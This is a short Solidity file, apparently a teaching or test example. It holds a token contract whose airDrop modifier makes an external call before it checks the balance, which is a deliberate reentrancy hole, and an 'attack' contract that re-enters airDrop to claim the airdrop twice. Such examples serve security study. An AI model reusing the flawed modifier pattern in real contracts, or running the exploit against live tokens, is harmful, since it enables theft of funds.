pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

  function airDrop() supportsToken hasNoBalance public {
    tokenBalance[msg.sender] += 20;
  }

  modifier supportsToken() {
    if (keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken()) {
      _;
    }
  }

  modifier hasNoBalance {
    if (tokenBalance[msg.sender] == 0) {
      _;
    }
  }
}

contract Bank {
    function supportsToken() external pure returns(bytes32) {
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack {
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32) {
        return _recurseSupport();
    }
    
    function _recurseSupport() internal returns(bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    
    function call(address token) public {
        _recurseCall(token);
    }
    
    function _recurseCall(address token) internal {
        ModifierEntrancy(token).airDrop();
    }
}